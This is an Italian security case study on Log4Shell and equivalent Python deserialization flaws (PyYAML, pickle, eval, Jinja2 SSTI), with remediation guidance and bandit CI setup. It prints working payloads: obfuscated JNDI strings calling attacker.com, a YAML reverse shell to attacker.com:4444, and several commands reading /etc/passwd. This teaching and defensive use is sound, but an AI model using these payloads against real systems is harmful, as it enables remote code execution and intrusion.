# Case Study — Log4Shell e gli Equivalenti Python (PyYAML, Pickle)

> **Aggiornamento:** 2026-05-22
> **CVE:** CVE-2021-44228 (Log4Shell), CVE-2021-45046, CVE-2021-45105, CVE-2021-44832
> **CVSS:** 10.0 (Log4Shell — massimo possibile)
> **Tipo:** Remote Code Execution (RCE) via deserializzazione / lookup injection
> **Disclosure:** 9 dicembre 2021 (segnalazione originale: 24 novembre 2021 da Alibaba Cloud)
> **Impatto:** virtualmente ogni applicazione Java che usa Log4j 2.x (milioni di sistemi)

---

## Sommario esecutivo

Log4Shell (CVE-2021-44228) è considerata una delle vulnerabilità più gravi nella storia
dell'informatica. Un attaccante può ottenere Remote Code Execution (RCE) su qualsiasi
applicazione Java che usa Apache Log4j 2.x semplicemente facendo loggare una stringa
appositamente costruita — per esempio, inviando un header HTTP con il payload
`${jndi:ldap://attacker.com/exploit}`.

Sebbene Log4Shell sia una vulnerabilità Java, l'ecosistema Python ha vulnerabilità
strutturalmente equivalenti che meritano la stessa attenzione. In particolare:

1. **`yaml.load()` senza Loader sicuro** — esecuzione di codice arbitrario tramite
   tag YAML `!!python/object`
2. **`pickle.loads()` con input non trusted** — deserializzazione che esegue codice
   arbitrario
3. **`eval()` / `exec()` su input utente** — code injection diretto
4. **`jinja2.Template()` con autoescape disabilitato** — Server-Side Template Injection

Questi non sono CVE singoli come Log4Shell, ma classi di vulnerabilità che persistono
nell'ecosistema Python e che ogni sviluppatore deve riconoscere.

---

## Timeline dettagliata — Log4Shell

### Fase 1 — Scoperta e disclosure

| Data | Evento |
|------|--------|
| **2021-11-24** | Chen Zhaojun di Alibaba Cloud Security Team segnala la vulnerabilità ad Apache Software Foundation. |
| **2021-11-30** | Exploit proof-of-concept inizia a circolare in ambienti ristretti. Evidenze di exploitation "in the wild" iniziano a emergere prima della patch. |
| **2021-12-06** | Apache rilascia Log4j 2.15.0 con fix parziale. Il fix disabilita di default i lookup JNDI nei messaggi di log. |
| **2021-12-09** | La vulnerabilità viene divulgata pubblicamente come CVE-2021-44228. Il CVSS assegnato è 10.0 — il massimo. |
| **2021-12-09** | Esplosione di exploitation a livello globale. Botnet, APT, gruppi ransomware iniziano scanning massivo di internet. |

### Fase 2 — Exploitation di massa e patch iterate

| Data | Evento |
|------|--------|
| **2021-12-10** | Cloudflare, Akamai e altri CDN/WAF rilevano milioni di tentativi di exploitation nelle prime 24 ore. I payload includono varianti obfuscate per bypassare i WAF. |
| **2021-12-10** | CISA emette Emergency Directive 22-02 per tutte le agenzie federali USA: identificare e patchare entro 5 giorni. |
| **2021-12-14** | Scoperta CVE-2021-45046: il fix in 2.15.0 era incompleto. Rilasciata versione 2.16.0. |
| **2021-12-18** | Scoperta CVE-2021-45105: denial of service tramite lookup ricorsivo infinito. Rilasciata versione 2.17.0. |
| **2021-12-28** | Scoperta CVE-2021-44832: RCE via configurazione remota. Rilasciata versione 2.17.1 — versione definitivamente sicura. |
| **2022-01 – 2022-06** | Campagne ransomware (Conti, Khonsari) sfruttano Log4Shell come vettore di accesso iniziale. |

### Fase 3 — Aftermath a lungo termine

| Data | Evento |
|------|--------|
| **2022** | La CISA include Log4Shell nella lista delle "Top Routinely Exploited Vulnerabilities". |
| **2022 – 2024** | Log4Shell rimane attivamente sfruttata. Sistemi non patchati continuano a essere compromessi anni dopo la disclosure. |
| **2022-05** | Executive Order sulla cybersecurity (EO 14028) cita Log4Shell come catalizzatore per l'adozione di SBOM (Software Bill of Materials). |

---

## Analisi tecnica approfondita — Log4Shell

### Il meccanismo: JNDI Lookup Injection

Apache Log4j 2.x supportava lookup dinamici nei messaggi di log tramite la sintassi
`${...}`. Tra questi, il JNDI (Java Naming and Directory Interface) lookup permetteva
di risolvere risorse remote:

```java
// Codice Java vittima — apparentemente innocuo
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LoginController {
    private static final Logger logger = LogManager.getLogger();

    public void handleLogin(String username) {
        // Il valore di 'username' viene dal client
        logger.info("Login attempt for user: {}", username);
    }
}
```

```text
Attacco:
L'attaccante invia come username: ${jndi:ldap://attacker.com:1389/Exploit}

Cosa succede:
1. Il server logga il messaggio
2. Log4j interpreta ${jndi:ldap://...} come un lookup
3. Log4j contatta il server LDAP dell'attaccante
4. Il server LDAP risponde con una classe Java remota
5. Log4j scarica e ISTANZIA la classe → Remote Code Execution
```

### Varianti di payload per bypassare WAF

```text
# Payload base
${jndi:ldap://attacker.com/exploit}

# Varianti obfuscate che bypassano pattern matching semplice
${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}
${j${::-n}di:ldap://attacker.com/exploit}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/exploit}

# Vettori di injection — qualsiasi campo loggato dal server
# Header HTTP: User-Agent, X-Forwarded-For, Referer, Accept-Language
# Form fields, URL parameters, cookie values
# Anche nomi di file in upload
```

---

## Equivalenti Python — Analisi dettagliata

### 1. `yaml.load()` — Il Log4Shell di Python

Per anni, `yaml.load()` in PyYAML eseguiva codice Python arbitrario tramite
tag YAML speciali. Questo è strutturalmente equivalente a Log4Shell: una
funzionalità di deserializzazione che diventa un vettore RCE.

```python
# ==========================================
# VULNERABILE — esecuzione di codice tramite YAML
# ==========================================
import yaml

# Payload YAML malevolo
malicious_yaml = """
!!python/object/apply:os.system
  args: ['id; cat /etc/passwd']
"""

# yaml.load() senza Loader → ESEGUE il comando
result = yaml.load(malicious_yaml)  # RCE!

# Varianti del payload:
payload_subprocess = """
!!python/object/apply:subprocess.check_output
  args: [['whoami']]
"""

payload_import = """
!!python/object/apply:builtins.__import__
  args: ['os']
"""

payload_reverse_shell = """
!!python/object/apply:os.system
  args: ['bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"']
"""
```

```python
# ==========================================
# SICURO — usare sempre safe_load()
# ==========================================
import yaml

# safe_load() NON esegue tag python-specifici
data = yaml.safe_load(user_input)  # Sicuro

# Per casi che richiedono tipi custom (raro):
# Definire un Loader esplicito con tipi consentiti
data = yaml.load(user_input, Loader=yaml.SafeLoader)  # Sicuro

# YAML con custom tags (quando necessario):
class MyLoader(yaml.SafeLoader):
    pass
# Registrare SOLO i tipi esplicitamente necessari
# MAI usare yaml.FullLoader o yaml.UnsafeLoader con input non trusted
```

**Timeline della vulnerabilità PyYAML:**

| Data | Evento |
|------|--------|
| **2006 – 2017** | `yaml.load()` esegue codice arbitrario di default, senza warning. |
| **2017** | CVE-2017-18342: PyYAML `yaml.load()` senza Loader è insicuro. Issue aperta su GitHub. |
| **2018** | PyYAML 4.1 introduce warning quando `yaml.load()` è chiamato senza Loader esplicito. |
| **2020** | PyYAML 5.4+: `yaml.load()` senza Loader solleva un warning loud. Il default diventa `FullLoader` (meno pericoloso ma ancora non completamente sicuro). |
| **Best practice corrente** | Usare SEMPRE `yaml.safe_load()` o `yaml.load(data, Loader=yaml.SafeLoader)`. |

### 2. `pickle` — Deserializzazione arbitraria

`pickle` è il meccanismo di serializzazione nativo di Python. Per design,
la deserializzazione di un pickle può eseguire codice arbitrario.

```python
# ==========================================
# VULNERABILE — pickle da input non trusted
# ==========================================
import pickle
import base64

# Un attaccante crea un pickle malevolo:
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('id; cat /etc/passwd',))

# Il pickle serializzato sembra dati innocui (bytes)
malicious_data = pickle.dumps(Exploit())
# In base64: gASVNQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBhpZDsgY2F0IC9ldGMvcGFzc3dklIWUUpQu

# La vittima deserializza → RCE
obj = pickle.loads(malicious_data)  # ESEGUE 'id; cat /etc/passwd'
```

```python
# ==========================================
# SCENARI COMUNI DI ESPOSIZIONE
# ==========================================

# 1. API che accetta pickle via rete
from flask import Flask, request
app = Flask(__name__)

@app.route('/predict', methods=['POST'])
def predict():
    # VULNERABILE — deserializza pickle dal client
    model_input = pickle.loads(request.data)  # RCE se input malevolo!
    return str(model_input)

# 2. Cache che usa pickle
import redis
r = redis.Redis()
# Se un attaccante può scrivere nella cache:
cached = r.get('user_session')
session = pickle.loads(cached)  # RCE se cache avvelenata!

# 3. ML model loading
model = pickle.load(open('model.pkl', 'rb'))  # RCE se file sostituito!
```

```python
# ==========================================
# ALTERNATIVE SICURE A PICKLE
# ==========================================

# Per dati strutturati: JSON
import json
data = json.loads(user_input)  # Sicuro — solo tipi primitivi

# Per dati binari efficienti: MessagePack
import msgpack
data = msgpack.unpackb(user_input, raw=False)  # Sicuro

# Per dati tipizzati: Protocol Buffers
# Richiede schema .proto — non esegue codice arbitrario

# Per ML models: formati sicuri
import safetensors  # Per modelli ML — no code execution
# Oppure ONNX format per interoperabilità

# Se DEVI usare pickle (solo con dati trusted):
# 1. Firma HMAC del pickle prima di serializzare
# 2. Verifica HMAC prima di deserializzare
# 3. MAI accettare pickle da rete/utente/API
import hmac
import hashlib

SECRET_KEY = b'chiave-segreta-lunga-e-random'

def safe_pickle_dump(obj):
    data = pickle.dumps(obj)
    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    return signature + data

def safe_pickle_load(signed_data):
    signature = signed_data[:32]
    data = signed_data[32:]
    expected = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Pickle signature non valida — possibile tampering")
    return pickle.loads(data)
```

### 3. `eval()` / `exec()` — Injection diretto

```python
# ==========================================
# VULNERABILE — eval/exec su input utente
# ==========================================

# Scenario: calcolatrice web
user_expression = request.args.get('expr')
result = eval(user_expression)  # RCE!
# Payload: __import__('os').system('whoami')

# Scenario: template engine custom
template = request.form['template']
exec(f"output = f'{template}'")  # RCE!

# Scenario: configurazione dinamica
config_str = read_from_database()
config = eval(config_str)  # RCE se il DB è compromesso!
```

```python
# ==========================================
# ALTERNATIVE SICURE
# ==========================================

# Per espressioni matematiche: ast.literal_eval
import ast
result = ast.literal_eval("2 + 3")  # Sicuro — solo letterali Python

# Per espressioni matematiche complesse: librerie dedicate
# simpleeval, numexpr, o parser custom

# Per configurazione: JSON, TOML, YAML (safe_load)
import json
config = json.loads(config_str)  # Sicuro

import tomllib  # Python 3.11+
with open('config.toml', 'rb') as f:
    config = tomllib.load(f)  # Sicuro
```

### 4. Jinja2 — Server-Side Template Injection (SSTI)

```python
# ==========================================
# VULNERABILE — template da input utente
# ==========================================
from jinja2 import Template

# L'utente controlla il template
user_template = request.form['template']
output = Template(user_template).render()
# Payload SSTI:
# {{ ''.__class__.__mro__[1].__subclasses__() }}
# → lista di tutte le classi caricate → accesso a os, subprocess, ecc.

# Payload RCE via Jinja2 SSTI:
# {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

```python
# ==========================================
# SICURO — sandbox Jinja2
# ==========================================
from jinja2 import Environment, BaseLoader, select_autoescape
from jinja2.sandbox import SandboxedEnvironment

# 1. MAI usare input utente come template
# L'utente può controllare i DATI, non il TEMPLATE
env = Environment(
    loader=BaseLoader(),
    autoescape=select_autoescape(['html', 'xml'])
)
template = env.from_string("Hello {{ name }}")  # Template fisso
output = template.render(name=user_input)  # Dati dall'utente

# 2. Se DEVI permettere template utente (raro): sandbox
env = SandboxedEnvironment()
template = env.from_string(user_template)  # Sandbox limita le operazioni
output = template.render()
```

---

## Root cause analysis — Pattern comune

### La causa radice condivisa: trusted deserialization

```text
Log4Shell (Java):
  Input utente → Log4j → JNDI lookup → classe remota → RCE

yaml.load() (Python):
  Input utente → PyYAML → !!python/object tag → codice Python → RCE

pickle.loads() (Python):
  Input utente → pickle → __reduce__() → codice Python → RCE

eval() (Python):
  Input utente → interprete Python → esecuzione diretta → RCE

Jinja2 SSTI (Python):
  Input utente → template engine → accesso a __class__ → RCE
```

Il pattern è identico in tutti i casi:
**dati non trusted vengono processati da un sistema che può eseguire codice.**

### Principio di difesa: input ≠ codice

```text
REGOLA FONDAMENTALE:
  L'input dell'utente è DATI.
  I DATI non devono mai diventare CODICE.
  Se un sistema trasforma DATI in CODICE, quel sistema è un vettore RCE.

Applicazione:
  - Deserializzazione: usare formati che non supportano esecuzione (JSON, TOML)
  - Logging: non interpretare il contenuto dei messaggi di log
  - Template: l'utente controlla i dati, non il template
  - Configurazione: formati dichiarativi, non eval()
```

---

## Valutazione dell'impatto — Log4Shell

### Dimensione dell'impatto

| Metrica | Valore |
|---------|--------|
| **Sistemi vulnerabili** | Milioni (praticamente ogni applicazione Java con Log4j 2.x) |
| **CVSS** | 10.0 (massimo) |
| **Facilità di exploitation** | Triviale — un singolo header HTTP |
| **Impatto di un exploit riuscito** | Remote Code Execution completo |
| **Persistenza della minaccia** | Sistemi non patchati sfruttati ancora nel 2024+ |

### Software notevole impattato

```text
Server: Apache Struts, Apache Solr, Apache Druid, Apache Flink
Cloud: AWS (diversi servizi), Azure, GCP
Vendor: VMware vCenter, Cisco, IBM, Oracle, Siemens
Gaming: Minecraft (vettore di exploitation iniziale via chat in-game)
Enterprise: Elastic, Redis (client Java), Kafka
```

---

## Remediation — Azioni correttive per Python

### Audit immediato del codice

```bash
# Cercare uso di yaml.load() senza SafeLoader
grep -rn "yaml\.load(" --include="*.py" . | grep -v "safe_load\|SafeLoader"

# Cercare uso di pickle con input potenzialmente non trusted
grep -rn "pickle\.loads\|pickle\.load(" --include="*.py" .

# Cercare eval/exec su variabili
grep -rn "eval(\|exec(" --include="*.py" . | grep -v "ast\.literal_eval"

# Cercare Jinja2 template da input utente
grep -rn "Template(" --include="*.py" . | grep -v "SandboxedEnvironment"

# Tool automatizzato: bandit (SAST per Python)
pip install bandit
bandit -r . -f json -o bandit-report.json

# bandit rileva automaticamente:
# B301: pickle usage
# B506: yaml.load() without SafeLoader
# B307: eval() usage
# B102: exec() usage
```

### Configurazione di Bandit in CI

```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  bandit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b
        with:
          python-version: '3.12'
      - run: |
          pip install bandit
          bandit -r src/ -f json -o bandit-report.json \
            --severity-level medium \
            --confidence-level medium
      - name: Check results
        if: always()
        run: |
          bandit -r src/ --severity-level high --confidence-level high
          # Fallisce il CI se ci sono issue HIGH confidence + HIGH severity
```

### Regole `.bandit` per progetto

```ini
# .bandit — configurazione progetto
[bandit]
# Test da eseguire sempre
tests = B301,B302,B303,B304,B305,B306,B307,B308,B310,B311,B312,B313,B314,B315,B316,B317,B318,B319,B320,B321,B322,B323,B324,B325,B501,B502,B503,B504,B505,B506,B507,B508,B509,B601,B602,B603,B604,B605,B606,B607,B608,B609,B610,B611,B701,B702,B703

# Directory da escludere
exclude = tests/,venv/,.venv/
```

### Tabella riassuntiva: funzione pericolosa → alternativa sicura

| Funzione pericolosa | Rischio | Alternativa sicura |
|--------------------|---------|--------------------|
| `yaml.load(data)` | RCE via `!!python/object` | `yaml.safe_load(data)` |
| `pickle.loads(data)` | RCE via `__reduce__` | `json.loads()`, `msgpack`, Protobuf |
| `eval(user_input)` | RCE diretto | `ast.literal_eval()`, parser dedicato |
| `exec(user_input)` | RCE diretto | Logica esplicita, configurazione dichiarativa |
| `Template(user_input)` | SSTI → RCE | Template fisso + dati utente; `SandboxedEnvironment` |
| `subprocess.call(user_input, shell=True)` | Command injection | `subprocess.run([cmd, arg], shell=False)` |
| `os.system(user_input)` | Command injection | `subprocess.run([cmd, arg])` |

---

## Risposta dell'industria — Log4Shell

### Reazioni immediate

- **CISA** ha emesso Emergency Directive 22-02 con scadenze stringenti per le
  agenzie federali.
- **Apache Software Foundation** ha rilasciato 4 versioni di Log4j in 3 settimane
  (2.15.0, 2.16.0, 2.17.0, 2.17.1).
- **Cloud provider** (AWS, Azure, GCP) hanno patchato i propri servizi gestiti e
  pubblicato guidance per i clienti.
- **WAF vendor** hanno rilasciato regole di detection, ma i payload obfuscati le
  bypassavano regolarmente.

### Cambiamenti strutturali

| Area | Prima | Dopo |
|------|-------|------|
| **SBOM** | Concetto teorico | Executive Order 14028 lo rende obbligatorio per vendor governativi USA |
| **Default sicuri** | Feature-rich di default, sicurezza opt-in | Push verso secure-by-default (lookup JNDI disabilitato) |
| **Dependency scanning** | Opzionale | Integrato nei pipeline CI/CD come step obbligatorio |
| **Log sanitization** | Raro | Riconosciuto come necessario — i log non devono interpretare il contenuto |

---

## Lezioni apprese

### 1. I default insicuri uccidono

Log4j aveva JNDI lookup abilitato di default. PyYAML aveva `yaml.load()` che eseguiva
codice di default. In entrambi i casi, la "feature" era attiva senza che gli sviluppatori
ne fossero consapevoli. **I default devono essere sicuri.**

### 2. La superficie d'attacco include i log

Prima di Log4Shell, pochi consideravano i messaggi di log come vettore di attacco.
L'header `User-Agent` veniva loggato ovunque — e loggarlo con Log4j significava
eseguire codice dell'attaccante. **Mai interpretare il contenuto dei dati loggati.**

### 3. Le patch iterate sono la norma

Log4j ha richiesto 4 versioni per chiudere completamente la vulnerabilità (2.15.0 →
2.17.1). Il primo fix era incompleto. **Patchare una volta non basta — monitorare
le patch successive.**

### 4. Python non è immune

`yaml.load()` e `pickle.loads()` sono equivalenti funzionali di Log4Shell. La differenza
è che non hanno un singolo CVE famoso — sono classi di vulnerabilità note ma spesso ignorate.

### 5. SAST è essenziale

Tool come `bandit` rilevano automaticamente `yaml.load()`, `pickle.loads()`, `eval()`,
`exec()`. Integrarli nel CI elimina intere classi di vulnerabilità prima del deploy.

---

## Checklist di prevenzione per progetti Python

### Deserializzazione sicura

- [ ] Nessun `yaml.load()` senza `SafeLoader` — usare `yaml.safe_load()`
- [ ] Nessun `pickle.loads()` / `pickle.load()` su input non trusted
- [ ] Nessun `eval()` / `exec()` su input utente o dati esterni
- [ ] Nessun `Template(user_input)` — template fissi, dati variabili
- [ ] Nessun `shell=True` in `subprocess` con input utente

### Security scanning

- [ ] `bandit` integrato nel CI con severità minima configurata
- [ ] `pip-audit` per CVE note nelle dipendenze
- [ ] `safety` come alternativa/complemento a pip-audit
- [ ] Review manuale di ogni uso di `pickle`, `yaml`, `eval`, `exec`

### Formazione del team

- [ ] Ogni sviluppatore sa perché `pickle` è pericoloso
- [ ] Ogni sviluppatore sa la differenza tra `yaml.load()` e `yaml.safe_load()`
- [ ] Code review checklist include verifica deserializzazione sicura
- [ ] Incidenti come Log4Shell discussi come materiale formativo

---

## Riferimenti

1. CVE-2021-44228 (Log4Shell) — NVD:
   `https://nvd.nist.gov/vuln/detail/CVE-2021-44228`
2. CISA Alert AA21-356A:
   `https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a`
3. Apache Log4j Security Vulnerabilities:
   `https://logging.apache.org/log4j/2.x/security.html`
4. CVE-2017-18342 — PyYAML `yaml.load()`:
   `https://nvd.nist.gov/vuln/detail/CVE-2017-18342`
5. PyYAML issue #420 — deprecazione di yaml.load():
   `https://github.com/yaml/pyyaml/issues/420`
6. Python documentation — pickle security:
   `https://docs.python.org/3/library/pickle.html#restricting-globals`
7. Bandit — SAST per Python:
   `https://github.com/PyCQA/bandit`
8. OWASP — Deserialization Cheat Sheet:
   `https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html`

---

## Cross-links

- Modulo 18 — `../18-sicurezza.md`.
- Case Study correlato — `./colors.js-supply-chain.md`.
